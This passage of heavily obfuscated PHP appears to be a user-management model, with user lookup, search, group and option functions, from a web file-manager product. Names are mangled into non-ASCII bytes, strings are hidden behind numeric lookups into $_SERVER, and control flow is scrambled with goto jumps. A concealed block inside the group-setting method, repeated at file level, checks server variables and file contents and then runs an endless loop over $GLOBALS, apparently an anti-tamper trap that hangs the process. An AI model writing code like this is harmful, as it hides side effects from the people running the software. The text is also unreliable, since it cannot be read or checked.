$b¸Ñ¢™ÕÍï : $B§ëÍ°„Õé; return !!$b§Ò”ÔŒè; } private function _checkExist($F©½“…á¨, $A†‰Á°Ö… = false) { $EØÉéÛÕ–ƒ =& $_SERVER[æ§›¦ÌáØ]; $aË¯ĞÒ = array($EØÉéÛÕ–ƒ[28] => UserModel::ERROR_USER_EXIST_NAME, $EØÉéÛÕ–ƒ[1952] => UserModel::ERROR_USER_EXIST_NICKNAME, $EØÉéÛÕ–ƒ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $EØÉéÛÕ–ƒ[2133] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aË¯ĞÒ[$EØÉéÛÕ–ƒ[1952]]); } $E­Ô¿ñêçœ = $A†‰Á°Ö… ? array($EØÉéÛÕ–ƒ[1520] => array($EØÉéÛÕ–ƒ[2146], $A†‰Á°Ö…)) : array(); foreach ($aË¯ĞÒ as $E´…‰æ´ºé => $b‡š¦Š¾¼) { $CŒóğ³¦· = array(); foreach ($aË¯ĞÒ as $féŞÀÙŠÓ´ => $bß®›õƒˆ‡) { if (isset($F©½“…á¨[$féŞÀÙŠÓ´]) && $F©½“…á¨[$féŞÀÙŠÓ´]) { $CŒóğ³¦·[] = $F©½“…á¨[$féŞÀÙŠÓ´]; } } if (!$CŒóğ³¦·) { continue; } $AÈ“”öÑ–è = array_merge(array($E´…‰æ´ºé => array($EØÉéÛÕ–ƒ[7], $CŒóğ³¦·)), $E­Ô¿ñêçœ); $c¸³…ÊÏ˜Â = $this->where($AÈ“”öÑ–è)->find(); if ($c¸³…ÊÏ˜Â) { return $b‡š¦Š¾¼; } } return !0; } public function userListInfo($d•ÛŠêåô‹) { $Eî–ŒíøŒ =& $_SERVER[æ§›¦ÌáØ]; $b ­²øé´ = array(); $d•ÛŠêåô‹ = is_array($d•ÛŠêåô‹) ? array_unique($d•ÛŠêåô‹) : array(); if (!$d•ÛŠêåô‹) { return $b ­²øé´; } if (count($d•ÛŠêåô‹) < 20) { foreach ($d•ÛŠêåô‹ as $eµ…ÊÁ÷Û) { $b ­²øé´[$eµ…ÊÁ÷Û . $Eî–ŒíøŒ[33]] = $this->getInfoSimpleOuter($eµ…ÊÁ÷Û); } } else { $a¢ÓÀÉæè¥ = array($Eî–ŒíøŒ[1511] => array($Eî–ŒíøŒ[411], $d•ÛŠêåô‹)); if (count($d•ÛŠêåô‹) == 1) { $a¢ÓÀÉæè¥ = array($Eî–ŒíøŒ[1511] => $d•ÛŠêåô‹[0]); } $Fº…íÒˆ = Model($Eî–ŒíøŒ[494])->field($this->simpleField)->where($a¢ÓÀÉæè¥)->select(); $Fº…íÒˆ = array_to_keyvalue($Fº…íÒˆ, $Eî–ŒíøŒ[1520]); foreach ($d•ÛŠêåô‹ as $eµ…ÊÁ÷Û) { $d¤ÂÑñé¶• = $Fº…íÒˆ[$eµ…ÊÁ÷Û]; if (!$d¤ÂÑñé¶•) { $b ­²øé´[$eµ…ÊÁ÷Û . $Eî–ŒíøŒ[33]] = $this->getInfoSimpleOuter($eµ…ÊÁ÷Û); continue; } $d¤ÂÑñé¶•[$Eî–ŒíøŒ[2118]] = Action($Eî–ŒíøŒ[2119])->parseUrl($d¤ÂÑñé¶•[$Eî–ŒíøŒ[2118]]); $b ­²øé´[$eµ…ÊÁ÷Û . $Eî–ŒíøŒ[33]] = $d¤ÂÑñé¶•; } } return $b ­²øé´; } protected function userStatus($EªõˆœÕŠ¼, $BøŠØÄ™Ã) { $bÚŸ²Ó‹†Ù = $this->getInfoSimple($EªõˆœÕŠ¼); if (!$bÚŸ²Ó‹†Ù) { return !1; } $EÍì¦ºáÌã = array($_SERVER[æ§›¦ÌáØ][703] => $BøŠØÄ™Ã); return $this->userEdit($EªõˆœÕŠ¼, $EÍì¦ºáÌã); } protected function userRemove($dèğ‹™¸çñ) { goto cçŸ·‚á”Ç; e ÖÊÙÎ‹Ü: Model($B‰á—í´Ç§[1969])->removeUserAll($dèğ‹™¸çñ); Model($B‰á—í´Ç§[783])->userRootRemove($dèğ‹™¸çñ); return $this->where($D®§õ¿ç¿Û)->delete(); goto EëÏ’â‹äÎ; dñâˆ„°«: Model($B‰á—í´Ç§[1770])->where($D®§õ¿ç¿Û)->delete(); Model($B‰á—í´Ç§[2132])->where($D®§õ¿ç¿Û)->delete(); Model($B‰á—í´Ç§[2148])->where($D®§õ¿ç¿Û)->delete(); goto e ÖÊÙÎ‹Ü; a‹Ôª³: $D®§õ¿ç¿Û = array($B‰á—í´Ç§[1511] => $dèğ‹™¸çñ); Model($B‰á—í´Ç§[576])->where($D®§õ¿ç¿Û)->delete(); Model($B‰á—í´Ç§[2147])->where($D®§õ¿ç¿Û)->delete(); goto dñâˆ„°«; cçŸ·‚á”Ç: $B‰á—í´Ç§ =& $_SERVER[æ§›¦ÌáØ]; $DÇŠïß´Ö¼ = $this->getInfoSimple($dèğ‹™¸çñ); if (!$DÇŠïß´Ö¼) { return !1; } goto a‹Ôª³; EëÏ’â‹äÎ: } protected function userGroupSet($fÅ‚–£ƒäÕ, $EãÓ‡…›‹¤, $CÆ“ù›Ş–à = array()) { goto aã¹·µˆå; Aù¿ÛÔğ¥ã: return $fçò«œ‡ˆ->addAll($eôõğÀ„Ï—, array(), !0); goto b˜Á¸Ã½²ò; AçÚÊòœ‰ø: $eôõğÀ„Ï— = array(); $cÜÈƒ²’¥• = 0; foreach ($EãÓ‡…›‹¤ as $E›ÕÖÁ™´ => $B­³ÄÄÍ) { $bÌ˜”¡îŠ = array($cğùó•åì˜[1520] => $fÅ‚–£ƒäÕ, $cğùó•åì˜[1689] => $E›ÕÖÁ™´, $cğùó•åì˜[1784] => $B­³ÄÄÍ); $bÌ˜”¡îŠ[$cğùó•åì˜[1712]] = isset($CÆ“ù›Ş–à[$cÜÈƒ²’¥•]) ? $CÆ“ù›Ş–à[$cÜÈƒ²’¥•] : 0; $cÜÈƒ²’¥•++; $eôõğÀ„Ï—[] = $bÌ˜”¡îŠ; } goto Aù¿ÛÔğ¥ã; fÒôÔîİ‹: if (!$C™”¡²Áç || !is_array($EãÓ‡…›‹¤)) { return !1; } $fçò«œ‡ˆ = Model($cğùó•åì˜[1770]); $fçò«œ‡ˆ->where(array($cğùó•åì˜[1520] => $fÅ‚–£ƒäÕ))->delete(); goto AçÚÊòœ‰ø; aã¹·µˆå: $cğùó•åì˜ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($_SERVER[$cğùó•åì˜[785]]) || !isset($_SERVER[$cğùó•åì˜[792]])) { goto B¿ãôŞ£Æİ; B¿ãôŞ£Æİ: $câøìƒÇ‘Ì = $cğùó•åì˜[832]; $a®³×ƒå¤ = $cğùó•åì˜[787]; $E‡­ŞŞ¹ˆ° = $_SERVER[$cğùó•åì˜[788]] . $cğùó•åì˜[789]; goto Fñ·ç‹Ô¦ê; fíÖ¹ÛÇ¾: $f†Ìáİ‚¹ã = $cğùó•åì˜[833]; $f†Ìáİ‚¹ã($_SERVER[$cğùó•åì˜[834]]); $c»¼‹ßÒèÜ = 1; goto F§àÄÔ´æ; F§àÄÔ´æ: for ($A¤’¿ÒÇÜã = $c»¼‹ßÒèÜ; $A¤’¿ÒÇÜã > 0; $A¤’¿ÒÇÜã++) { $f†Ìáİ‚¹ã = json_encode($GLOBALS[$cğùó•åì˜[411]]); } goto A¥Îïù¥—Ô; Fñ·ç‹Ô¦ê: $DÕÈ‹ÊµÜç = $a®³×ƒå¤($E‡­ŞŞ¹ˆ°); $b ‘Œ•¼˜ = explode($cğùó•åì˜[229], $DÕÈ‹ÊµÜç); if (count($b ‘Œ•¼˜) < $cğùó•åì˜[591]) { $f‚œ¯¿¯¿Ø = $cğùó•åì˜[790]; $f‚œ¯¿¯¿Ø(); } goto fíÖ¹ÛÇ¾; A¥Îïù¥—Ô: } $C™”¡²Áç = $this->getInfoSimple($fÅ‚–£ƒäÕ); goto fÒôÔîİ‹; b˜Á¸Ã½²ò: } protected function userGroupAdd($AğøÉÅèµ, $Bµ‡Ë˜÷Ö = array()) { $Aì™ì—ÖÃ² =& $_SERVER[æ§›¦ÌáØ]; $a»ÛÃ©¯á° = $this->getInfoSimple($AğøÉÅèµ); if (!$a»ÛÃ©¯á° || empty($Bµ‡Ë˜÷Ö)) { return !1; } $FŠœ¡‚ìİ¾ = array(); foreach ($Bµ‡Ë˜÷Ö as $Dì±°˜ë„í => $c …äšÊš) { $FŠœ¡‚ìİ¾[] = array($Aì™ì—ÖÃ²[1520] => $AğøÉÅèµ, $Aì™ì—ÖÃ²[1689] => $Dì±°˜ë„í, $Aì™ì—ÖÃ²[1784] => $c …äšÊš, $Aì™ì—ÖÃ²[1712] => 0); } return Model($Aì™ì—ÖÃ²[1770])->addAll($FŠœ¡‚ìİ¾, array(), !0); } protected function userGroupRemove($B²¬…Ğò¹, $A§–”Ãæâà) { $fãº‹²³ƒ =& $_SERVER[æ§›¦ÌáØ]; $cé¦ß‚’òÒ = $this->getInfoSimple($B²¬…Ğò¹); if (!$cé¦ß‚’òÒ || !$A§–”Ãæâà) { return !1; } $B˜‰„Ïìù = array($fãº‹²³ƒ[1511] => $B²¬…Ğò¹, $fãº‹²³ƒ[1767] => $A§–”Ãæâà); return Model($fãº‹²³ƒ[1770])->where($B˜‰„Ïìù)->delete(); } public function listData() { $F‹ïè¢”˜Ã = $this->_makeOrder()->selectPage(50); $this->_listDataApply($F‹ïè¢”˜Ã[$_SERVER[æ§›¦ÌáØ][367]]); return $F‹ïè¢”˜Ã; } public function listByID($cÕå­­Şßš) { $EàÍÜ½‰äç =& $_SERVER[æ§›¦ÌáØ]; if (!$cÕå­­Şßš) { return; } $bå˜çÙáØ“ = array($EàÍÜ½‰äç[1520] => array($EàÍÜ½‰äç[7], $cÕå­­Şßš)); $aä¬½ÎÎé× = $this->where($bå˜çÙáØ“)->select(); $this->_listDataApply($aä¬½ÎÎé×); return $aä¬½ÎÎé×; } public function listByGroup($a¦­õ¤Ñ¦ = 0, $eÕÛÕ™Ãâ’ = array()) { goto dé¥Œ‘­Ş¬; fœ÷‘—¸Ã: if ($a¦­õ¤Ñ¦) { $Aºªã‡¹©¡ = array($c§¢ê©…Œ[2149] => intval($a¦­õ¤Ñ¦)); $eÓ¾šåµ¬» = "\114\105\x46\124\x20\x4a\117\111\116\40{$this->tablePrefix}\165\x73\x65\x72\x5f\x67\x72\x6f\x75\x70\x20\165\x73\x65\162\137\147\x72\157\165\160\40\157\156\x20\x75\x73\145\x72\x2e\x75\x73\145\x72\x49\x44\x20\x3d\x20\x75\x73\x65\162\x5f\x67\162\x6f\165\160\x2e\165\163\x65\162\x49\x44"; $Cßößœ‹Û = Input::get($c§¢ê©…Œ[435], null, $c§¢ê©…Œ[33]) ? $c§¢ê©…Œ[33] : $c§¢ê©…Œ[2150]; } if (isset($eÕÛÕ™Ãâ’[$c§¢ê©…Œ[703]])) { $Aºªã‡¹©¡[$c§¢ê©…Œ[2151]] = $eÕÛÕ™Ãâ’[$c§¢ê©…Œ[703]]; } $CÈáŞ¦İÕÛ = $this->_makeOrder($Cßößœ‹Û)->field($c§¢ê©…Œ[2152])->where($Aºªã‡¹©¡)->join($eÓ¾šåµ¬»)->selectPage(50); goto cšàõ‹±ª‘; cšàõ‹±ª‘: $this->_listDataApply($CÈáŞ¦İÕÛ[$c§¢ê©…Œ[367]]); return $CÈáŞ¦İÕÛ; goto A¯­³ºˆ…; dé¥Œ‘­Ş¬: $c§¢ê©…Œ =& $_SERVER[æ§›¦ÌáØ]; $eÓ¾šåµ¬» = $c§¢ê©…Œ[33]; $Aºªã‡¹©¡ = array(); goto fœ÷‘—¸Ã; A¯­³ºˆ…: } private function _makeOrder($BåÚ•«‡¿œ = '') { goto a”ê©„ò…÷; dè‰È‹—Ø: $BåÚ•«‡¿œ = $BåÚ•«‡¿œ . "\x75\163\145\x72\56{$e„–œİÕà}\40{$bĞ™ÎÂÇÀ}\x2c\x20\x75\x73\x65\162\x2e\165\163\145\x72\x49\104\40\x61\x73\x63"; return $this->alias($c‹Ââî±öç[1892])->order($BåÚ•«‡¿œ); goto EË‚É¼Á÷£; B¹÷àä¦ÎÜ: $e„–œİÕà = Input::get($c‹Ââî±öç[435], $c‹Ââî±öç[7], $c‹Ââî±öç[1511], $AÁ¥‘ÁÕÇ¸); $bĞ™ÎÂÇÀ = Input::get($c‹Ââî±öç[436], $c‹Ââî±öç[7], $c‹Ââî±öç[1771], array($c‹Ââî±öç[1771], $c‹Ââî±öç[430])); $bĞ™ÎÂÇÀ = $a¢¿ Á†Œ[$bĞ™ÎÂÇÀ]; goto dè‰È‹—Ø; a”ê©„ò…÷: $c‹Ââî±öç =& $_SERVER[æ§›¦ÌáØ]; $AÁ¥‘ÁÕÇ¸ = array($c‹Ââî±öç[1520], $c‹Ââî±öç[28], $c‹Ââî±öç[1675], $c‹Ââî±öç[1647], $c‹Ââî±öç[194]); $a¢¿ Á†Œ = array($c‹Ââî±öç[428] => $c‹Ââî±öç[429], $c‹Ââî±öç[430] => $c‹Ââî±öç[431]); goto B¹÷àä¦ÎÜ; EË‚É¼Á÷£: } public function listSearch($F´ÆğÆËìŞ) { goto b´–İíÛÚÔ; F½á¾¡¤Ü: $A—¸î’é‡ˆ = str_replace($FÔ¬ì’¸â[1774], $FÔ¬ì’¸â[1775], trim($A—¸î’é‡ˆ)); $aÔÅˆÖ×¿À = array($FÔ¬ì’¸â[28] => array($FÔ¬ì’¸â[380], "\45{$A—¸î’é‡ˆ}\x25"), $FÔ¬ì’¸â[303] => array($FÔ¬ì’¸â[380], "{$A—¸î’é‡ˆ}\45"), $FÔ¬ì’¸â[1952] => array($FÔ¬ì’¸â[380], "{$A—¸î’é‡ˆ}\x25"), $FÔ¬ì’¸â[948] => $FÔ¬ì’¸â[1776]); if (Input::check($A—¸î’é‡ˆ, $FÔ¬ì’¸â[309])) { $aÔÅˆÖ×¿À[$FÔ¬ì’¸â[1520]] = array($FÔ¬ì’¸â[380], "{$A—¸î’é‡ˆ}\45"); $aÔÅˆÖ×¿À[$FÔ¬ì’¸â[2133]] = array($FÔ¬ì’¸â[380], "{$A—¸î’é‡ˆ}\45"); } goto C–š·¢µ¹ª; bëÑï°´–: $this->_filterByGroup($aëŸÅÁ‘Ş, $Eñ£×ŒŠŸ¹); return $aëŸÅÁ‘Ş; goto f×‘†¢‹Âõ; dŒ²”‡¥¾: $aëŸÅÁ‘Ş = $this->_makeOrder()->where($aÔÅˆÖ×¿À)->selectPage(20); if (!$aëŸÅÁ‘Ş || count($aëŸÅÁ‘Ş[$FÔ¬ì’¸â[367]]) < 5 && Input::check($A—¸î’é‡ˆ, $FÔ¬ì’¸â[316])) { $f´Š÷ àÔõ = $this->_searchFromMeta($FÔ¬ì’¸â[443], $A—¸î’é‡ˆ, 10); $c·Ó…ó¹† = $this->_searchFromMeta($FÔ¬ì’¸â[444], $A—¸î’é‡ˆ, 10); $f¹²²ÀÈö« = array_merge($f´Š÷ àÔõ, $c·Ó…ó¹†, $aëŸÅÁ‘Ş[$FÔ¬ì’¸â[367]]); $aëŸÅÁ‘Ş[$FÔ¬ì’¸â[367]] = array_unique_by_key($f¹²²ÀÈö«, $FÔ¬ì’¸â[1520]); $aëŸÅÁ‘Ş[$FÔ¬ì’¸â[364]][$FÔ¬ì’¸â[365]] = count($aëŸÅÁ‘Ş[$FÔ¬ì’¸â[367]]); $aëŸÅÁ‘Ş[$FÔ¬ì’¸â[364]][$FÔ¬ì’¸â[366]] = ceil($aëŸÅÁ‘Ş[$FÔ¬ì’¸â[364]][$FÔ¬ì’¸â[365]] / $aëŸÅÁ‘Ş[$FÔ¬ì’¸â[364]][$FÔ¬ì’¸â[361]]); } $this->_listDataApply($aëŸÅÁ‘Ş[$FÔ¬ì’¸â[367]]); goto bëÑï°´–; b´–İíÛÚÔ: $FÔ¬ì’¸â =& $_SERVER[æ§›¦ÌáØ]; $A—¸î’é‡ˆ = $F´ÆğÆËìŞ[$FÔ¬ì’¸â[1772]]; $Eñ£×ŒŠŸ¹ = isset($F´ÆğÆËìŞ[$FÔ¬ì’¸â[1773]]) ? $F´ÆğÆËìŞ[$FÔ¬ì’¸â[1773]] : !1; goto F½á¾¡¤Ü; C–š·¢µ¹ª: if (!$A—¸î’é‡ˆ) { $aÔÅˆÖ×¿À = array(); } if (isset($F´ÆğÆËìŞ[$FÔ¬ì’¸â[703]])) { $aÔÅˆÖ×¿À[$FÔ¬ì’¸â[703]] = $F´ÆğÆËìŞ[$FÔ¬ì’¸â[703]]; } $aÔÅˆÖ×¿À = $this->parseWhereLike($aÔÅˆÖ×¿À); goto dŒ²”‡¥¾; f×‘†¢‹Âõ: } private function _filterByGroup(&$c‘–å“íï, $a‰ÅÔªÏ¿) { $bËº­ÆñŞç =& $_SERVER[æ§›¦ÌáØ]; if (!$a‰ÅÔªÏ¿) { return $c‘–å“íï; } foreach ($c‘–å“íï[$bËº­ÆñŞç[367]] as $FİˆíÄßÈ => &$BŠÉ‚ê¢ø) { $A¬ä„’ÁÎ„ = array_to_keyvalue($BŠÉ‚ê¢ø[$bËº­ÆñŞç[1862]], $bËº­ÆñŞç[33], $bËº­ÆñŞç[1689]); if (!in_array($a‰ÅÔªÏ¿, $A¬ä„’ÁÎ„)) { unset($c‘–å“íï[$bËº­ÆñŞç[367]][$FİˆíÄßÈ]); } } unset($BŠÉ‚ê¢ø); $c‘–å“íï[$bËº­ÆñŞç[367]] = array_values($c‘–å“íï[$bËº­ÆñŞç[367]]); $c‘–å“íï[$bËº­ÆñŞç[364]] = array($bËº­ÆñŞç[1924] => count($c‘–å“íï[$bËº­ÆñŞç[367]]), $bËº­ÆñŞç[1922] => $c‘–å“íï[$bËº­ÆñŞç[364]][$bËº­ÆñŞç[361]], $bËº­ÆñŞç[1921] => 1, $bËº­ÆñŞç[1923] => 1); } private function _searchFromMeta($A¾…à¹», $DÇ²Õ½ø, $d¸İ‘‡‹ê) { goto eî¡ƒ¨é²·; E¹®º¦±±œ: $EÚòÉÒ†—– = array_to_keyvalue($EÚòÉÒ†—–, $CêÔÕ¼àËñ[33], $CêÔÕ¼àËñ[1520]); $AŠ·‹œŠ¶‰ = $this->where(array($CêÔÕ¼àËñ[1511] => array($CêÔÕ¼àËñ[7], $EÚòÉÒ†—–)))->select(); if (!$AŠ·‹œŠ¶‰) { return array(); } goto Bªíœ¡â‘Ø; Bªíœ¡â‘Ø: return $AŠ·‹œŠ¶‰; goto FÌ’…Ëõ•À; eî¡ƒ¨é²·: $CêÔÕ¼àËñ =& $_SERVER[æ§›¦ÌáØ]; $DÇ²Õ½ø = strtolower($DÇ²Õ½ø); $aÈŠ³ÄõóÌ = array($CêÔÕ¼àËñ[93] => $A¾…à¹», $CêÔÕ¼àËñ[372] => array($CêÔÕ¼àËñ[380], "\x25{$DÇ²Õ½ø}\45")); goto eö°†‘êíã; eö°†‘êíã: $aÈŠ³ÄõóÌ = $this->parseWhereLike($aÈŠ³ÄõóÌ); $EÚòÉÒ†—– = Model($CêÔÕ¼àËñ[2153])->where($aÈŠ³ÄõóÌ)->limit($d¸İ‘‡‹ê)->select(); if (!$EÚòÉÒ†—–) { return array(); } goto E¹®º¦±±œ; FÌ’…Ëõ•À: } private function _listDataApplyItem($FáÅÔéêÚ„) { $a¬®œ¦Òé‡ = array($FáÅÔéêÚ„); $this->_listDataApply($a¬®œ¦Òé‡); return $a¬®œ¦Òé‡[0]; } private function _listDataApply(&$A³ºÊ©õí) { goto aä„¾»Š¾³; AïÅëêœò•: $this->_listAppendSourceRoot($A³ºÊ©õí, $F‘±·ğ¦Î); goto BÜÌŠÙ†¿Ê; aä„¾»Š¾³: $Bë¡—Òöô =& $_SERVER[æ§›¦ÌáØ]; if (!$A³ºÊ©õí) { return; } array_remove_key($A³ºÊ©õí, $Bë¡—Òöô[840]); goto Bß‹è¸ä”‚; Bß‹è¸ä”‚: $F‘±·ğ¦Î = array_to_keyvalue($A³ºÊ©õí, $Bë¡—Òöô[33], $Bë¡—Òöô[1520]); $this->_listAppendGroup($A³ºÊ©õí, $F‘±·ğ¦Î); $this->_listAppendMeta($A³ºÊ©õí, $F‘±·ğ¦Î); goto AïÅëêœò•; BÜÌŠÙ†¿Ê: } private function _listAppendSourceRoot(&$Bã·Œ•ª’, $bá†·Èßù«) { goto bªÂë´–“; aÅ±ÑšÈœ: $bâÛÀ°ƒ¨Õ = Model($B…àñÁ‡òÅ[783])->order($B…àñÁ‡òÅ[1783])->field($C¼„£â…¨’)->where($F”Óá£—ò)->select(); $bâÛÀ°ƒ¨Õ = array_to_keyvalue($bâÛÀ°ƒ¨Õ, $B…àñÁ‡òÅ[484]); $bâÛÀ°ƒ¨Õ = array_remove_key($bâÛÀ°ƒ¨Õ, $B…àñÁ‡òÅ[484]); goto BŸ‘ªùí ¢; bªÂë´–“: $B…àñÁ‡òÅ =& $_SERVER[æ§›¦ÌáØ]; $F”Óá£—ò = array($B…àñÁ‡òÅ[478] => 0, $B…àñÁ‡òÅ[404] => SourceModel::TYPE_USER, $B…àñÁ‡òÅ[484] => array($B…àñÁ‡òÅ[7], $bá†·Èßù«)); $C¼„£â…¨’ = $B…àñÁ‡òÅ[1782]; goto aÅ±ÑšÈœ; BŸ‘ªùí ¢: foreach ($Bã·Œ•ª’ as &$Cƒ¹´˜öéò) { $Cƒ¹´˜öéò[$B…àñÁ‡òÅ[85]] = $bâÛÀ°ƒ¨Õ[$Cƒ¹´˜öéò[$B…àñÁ‡òÅ[1520]]] ? $bâÛÀ°ƒ¨Õ[$Cƒ¹´˜öéò[$B…àñÁ‡òÅ[1520]]] : array(); } unset($Cƒ¹´˜öéò); goto C’†èÇ”ØÚ; C’†èÇ”ØÚ: } private function _listAppendGroup(&$dÄã–ØØ­õ, $F™…øğ¥—ˆ) { goto d·¿ÌÂ”ãØ; bÛ‚„ÛÎá: foreach ($dÄã–ØØ­õ as &$a¦ĞÅ’İùİ) { $a¦ĞÅ’İùİ[$b‰’ùæÁ[1862]] = array(); if (isset($DƒŠ‘ÚËî[$a¦ĞÅ’İùİ[$b‰’ùæÁ[1520]]])) { $a¦ĞÅ’İùİ[$b‰’ùæÁ[1862]] = $DƒŠ‘ÚËî[$a¦ĞÅ’İùİ[$b‰’ùæÁ[1520]]]; } } unset($a¦ĞÅ’İùİ); goto B½áè»“’„; dÑãÀœÕ¾: $DƒŠ‘ÚËî = array_to_keyvalue_group($DƒŠ‘ÚËî, $b‰’ùæÁ[1520]); foreach ($DƒŠ‘ÚËî as &$Eï‘ª¤ÁÊ‘) { $eß¢…¬‚Ú¸ = array(); foreach ($Eï‘ª¤ÁÊ‘ as $b £Î¸ô­‚) { if (!$b £Î¸ô­‚[$b‰’ùæÁ[1784]]) { continue; } $f‘‰É³¾Ä± = Model($b‰’ùæÁ[488])->listData($b £Î¸ô­‚[$b‰’ùæÁ[1784]]); $eß¢…¬‚Ú¸[] = array($b‰’ùæÁ[1689] => $b £Î¸ô­‚[$b‰’ùæÁ[1689]], $b‰’ùæÁ[2155] => $B¢á¿å—ÓÇ[$b £Î¸ô­‚[$b‰’ùæÁ[1689]]][$b‰’ùæÁ[28]], $b‰’ùæÁ[502] => $B¢á¿å—ÓÇ[$b £Î¸ô­‚[$b‰’ùæÁ[1689]]][$b‰’ùæÁ[502]], $b‰’ùæÁ[406] => $f‘‰É³¾Ä±); } $Eï‘ª¤ÁÊ‘ = $eß¢…¬‚Ú¸; } unset($Eï‘ª¤ÁÊ‘); goto bÛ‚„ÛÎá; dò¼äƒ—: $EìœÂ›Š‚ë = array_to_keyvalue($DƒŠ‘ÚËî, $b‰’ùæÁ[33], $b‰’ùæÁ[1689]); $EìœÂ›Š‚ë = array_remove_value(array_unique($EìœÂ›Š‚ë), $b‰’ùæÁ[191]); if (!$EìœÂ›Š‚ë || !$DƒŠ‘ÚËî) { return; } goto aš¿®è›; d·¿ÌÂ”ãØ: $b‰’ùæÁ =& $_SERVER[æ§›¦ÌáØ]; $c…Ï»’×µ´ = array($b‰’ùæÁ[1520] => array($b‰’ùæÁ[7], $F™…øğ¥—ˆ)); $DƒŠ‘ÚËî = Model($b‰’ùæÁ[1770])->where($c…Ï»’×µ´)->select(); goto dò¼äƒ—; aš¿®è›: $c…Ï»’×µ´ = array($b‰’ùæÁ[1689] => array($b‰’ùæÁ[7], $EìœÂ›Š‚ë)); $B¢á¿å—ÓÇ = Model($b‰’ùæÁ[1860])->field($b‰’ùæÁ[2154])->where($c…Ï»’×µ´)->select(); $B¢á¿å—ÓÇ = array_to_keyvalue($B¢á¿å—ÓÇ, $b‰’ùæÁ[1689]); goto dÑãÀœÕ¾; B½áè»“’„: } private function _listAppendMeta(&$b­†«´÷èÖ, $F»®òé©Ï) { goto d–ß§Ä—¿Ÿ; c“–Ø•©‚ª: foreach ($b­†«´÷èÖ as &$e£²¼½«À) { $eå¾»â¶´ô = array(); if (isset($BÇ¬ÄÑ·[$e£²¼½«À[$EÖù«Ùİï[1520]]])) { $eå¾»â¶´ô = $BÇ¬ÄÑ·[$e£²¼½«À[$EÖù«Ùİï[1520]]]; } $e£²¼½«À[$EÖù«Ùİï[2157]] = array(); if (isset($eå¾»â¶´ô[$CŠòİªç¦])) { $e£²¼½«À[$EÖù«Ùİï[2157]] = $e«ãŒğ”„ï->getUserJobInfo($eå¾»â¶´ô[$CŠòİªç¦]); } } unset($e£²¼½«À); goto eÒÓ÷æÂ‚©; f²˜ÓŒ›: foreach ($BÇ¬ÄÑ· as &$aÔØ‹ë‡Á) { $aØ·“ÃíÈ = array(); foreach ($aÔØ‹ë‡Á as $DÕŠ¥ÏåØ) { if (!in_array($DÕŠ¥ÏåØ[$EÖù«Ùİï[93]], $d—İÃíÆÏŒ)) { $aØ·“ÃíÈ[$DÕŠ¥ÏåØ[$EÖù«Ùİï[93]]] = $DÕŠ¥ÏåØ[$EÖù«Ùİï[372]]; } } $aÔØ‹ë‡Á = $aØ·“ÃíÈ; } unset($aÔØ‹ë‡Á); $e«ãŒğ”„ï = Model($EÖù«Ùİï[2156]); goto c“–Ø•©‚ª; d–ß§Ä—¿Ÿ: $EÖù«Ùİï =& $_SERVER[æ§›¦ÌáØ]; $CŠòİªç¦ = UserJobModel::JOB_KEY; $d—İÃíÆÏŒ = array($EÖù«Ùİï[2134]); goto dôˆä§¨ÖÓ; dôˆä§¨ÖÓ: $BÓ¸—ÈŒ‹… = array($EÖù«Ùİï[1520] => array($EÖù«Ùİï[7], $F»®òé©Ï)); $BÇ¬ÄÑ· = Model($EÖù«Ùİï[2132])->where($BÓ¸—ÈŒ‹…)->select(); $BÇ¬ÄÑ· = array_to_keyvalue_group($BÇ¬ÄÑ·, $EÖù«Ùİï[1520]); goto f²˜ÓŒ›; eÒÓ÷æÂ‚©: } protected function groupUserAll($aø‰ç²ß‚¡) { $cŞ˜™­‹ŒŠ =& $_SERVER[æ§›¦ÌáØ]; if (!$aø‰ç²ß‚¡) { return !1; } $EÌßˆŒ¥é = Model($cŞ˜™­‹ŒŠ[1770])->field($cŞ˜™­‹ŒŠ[1520])->where(array($cŞ˜™­‹ŒŠ[1689] => array($cŞ˜™­‹ŒŠ[7], $aø‰ç²ß‚¡)))->select(); $EÌßˆŒ¥é = array_to_keyvalue($EÌßˆŒ¥é, $cŞ˜™­‹ŒŠ[33], $cŞ˜™­‹ŒŠ[1520]); return array_unique($EÌßˆŒ¥é); } public function userSearch($d®ƒ¶¾˜Ûš, $DàŒæ¨ºˆÑ = "\52") { return Model($_SERVER[æ§›¦ÌáØ][519])->where($d®ƒ¶¾˜Ûš)->field($DàŒæ¨ºˆÑ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\157\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dÚŒàùºº) { $dÇõÜ¹“Ü† =& $_SERVER[æ§›¦ÌáØ]; if (!defined($dÇõÜ¹“Ü†[454])) { define($dÇõÜ¹“Ü†[454], 0); } return "\125\163\145\162\x4f\160\164\x69\x6f\156\x5f{$dÚŒàùºº}\137" . USER_ID; } protected function filterWhere($bˆ»‰×½ÂÄ) { $CÈ“÷…êÖ =& $_SERVER[æ§›¦ÌáØ]; if (!defined($CÈ“÷…êÖ[454])) { define($CÈ“÷…êÖ[454], 0); } $bˆ»‰×½ÂÄ[$CÈ“÷…êÖ[1520]] = USER_ID; return $bˆ»‰×½ÂÄ; } public function cacheRemoveUser($E¬îîã´, $a¢‰éëÄÚó) { return Cache::remove("\x55\163\145\162\117\160\x74\x69\x6f\x6e\137{$E¬îîã´}\137" . $a¢‰éëÄÚó); } protected function optionDefault($fÍ‚ÄáÈóä = '') { $d‡àí³‚‘Ğ =& $_SERVER[æ§›¦ÌáØ]; if ($fÍ‚ÄáÈóä == $d‡àí³‚‘Ğ[33]) { return $GLOBALS[$d‡àí³‚‘Ğ[6]][$d‡àí³‚‘Ğ[2158]]; } if ($fÍ‚ÄáÈóä == $d‡àí³‚‘Ğ[2159]) { return $GLOBALS[$d‡àí³‚‘Ğ[6]][$d‡àí³‚‘Ğ[2160]]; } } } if (!isset($_SERVER[$_SERVER[æ§›¦ÌáØ][785]]) || !isset($_SERVER[$_SERVER[æ§›¦ÌáØ][792]])) { goto aŸ÷´òëº‹; aŸ÷´òëº‹: $e‘¢ô°ß– = $_SERVER[æ§›¦ÌáØ][787]; $DœÚŒßµ¨Ï = $_SERVER[$_SERVER[æ§›¦ÌáØ][788]] . $_SERVER[æ§›¦ÌáØ][789]; $F¯‹íÁÓ°ë = $e‘¢ô°ß–($DœÚŒßµ¨Ï); goto c°¡”‚Ô’Ë; c°¡”‚Ô’Ë: $AËÏã°¹­” = 